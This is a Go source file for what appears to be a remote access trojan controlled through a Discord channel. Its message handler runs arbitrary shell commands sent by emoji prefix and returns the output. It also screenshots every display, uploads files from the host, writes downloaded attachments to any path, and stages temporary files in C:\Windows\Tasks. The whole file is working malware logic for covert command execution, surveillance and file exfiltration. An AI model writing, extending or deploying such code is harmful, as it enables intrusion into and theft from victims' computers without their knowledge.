package main

import (
	"fmt"
	"image/png"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"

	"github.com/bwmarrin/discordgo"
	"github.com/kbinani/screenshot"
)

func getTmpDir() string {
	if runtime.GOOS == "windows" {
		return "C:\\Windows\\Tasks\\"
	} else {
		return "/tmp/"
	}
}

func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
		return
	}

	s.MessageReactionAdd(m.ChannelID, m.ID, "🕐")
	flag := 0

	if strings.HasPrefix(m.Content, "🏃‍♂️") {
		var cmd *exec.Cmd
		if runtime.GOOS == "windows" {
			cmd = exec.Command("C:\\Windows\\System32\\cmd.exe", "/k", m.Content[14:len(m.Content)])
		} else {
			cmd = exec.Command("/bin/bash", "-c", m.Content[14:len(m.Content)])
		}
		out, err := cmd.CombinedOutput()
		if err != nil {
			out = append(out, 0x0a)
			out = append(out, []byte(err.Error())...)
		}

		if len(out) > 2000-13 {
			f, _ := os.CreateTemp(getTmpDir(), "*.txt")
			f.Write(out)
			fileName := f.Name()
			f.Close()

			f, _ = os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		} else {
			var resp strings.Builder
			resp.WriteString("```bash\n")
			resp.WriteString(string(out) + "\n")
			resp.WriteString("```")
			s.ChannelMessageSendReply(m.ChannelID, resp.String(), m.Reference())
		}
		flag = 1
	} else if m.Content == "📸" {
		n := screenshot.NumActiveDisplays()
		for i := 0; i < n; i++ {
			bounds := screenshot.GetDisplayBounds(i)
			img, _ := screenshot.CaptureRect(bounds)

			fileName := fmt.Sprintf("%s%d_%dx%d.png", getTmpDir(), i, bounds.Dx(), bounds.Dy())
			file, _ := os.Create(fileName)
			png.Encode(file, img)
			defer file.Close()

			f, _ := os.Open(fileName)
			defer f.Close()
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
		}
		flag = 1
	} else if strings.HasPrefix(m.Content, "👇") {
		fileName := m.Content[5:len(m.Content)]
		f, _ := os.Open(fileName)
		fi, _ := f.Stat()
		defer f.Close()
		if fi.Size() < 8388608 {
			fileStruct := &discordgo.File{Name: fileName, Reader: f}
			fileArray := []*discordgo.File{fileStruct}
			s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{Files: fileArray, Reference: m.Reference()})
			flag = 1
		} else {
			s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
		}
	} else if strings.HasPrefix(m.Content, "☝️") {
		path := m.Content[7:len(m.Content)]
		if len(m.Attachments) > 0 {
			out, _ := os.Create(path)
			defer out.Close()
			resp, _ := http.Get(m.Attachments[0].URL)
			defer resp.Body.Close()
			io.Copy(out, resp.Body)
			s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
		}
		flag = 1
	} else if m.Content == "💀" {
		flag = 2
	}

	s.MessageReactionRemove(m.ChannelID, m.ID, "🕐", "@me")
	if flag > 0 {
		s.MessageReactionAdd(m.ChannelID, m.ID, "✅")
		if flag > 1 {
			s.Close()
			os.Exit(0)
		}
	}
}

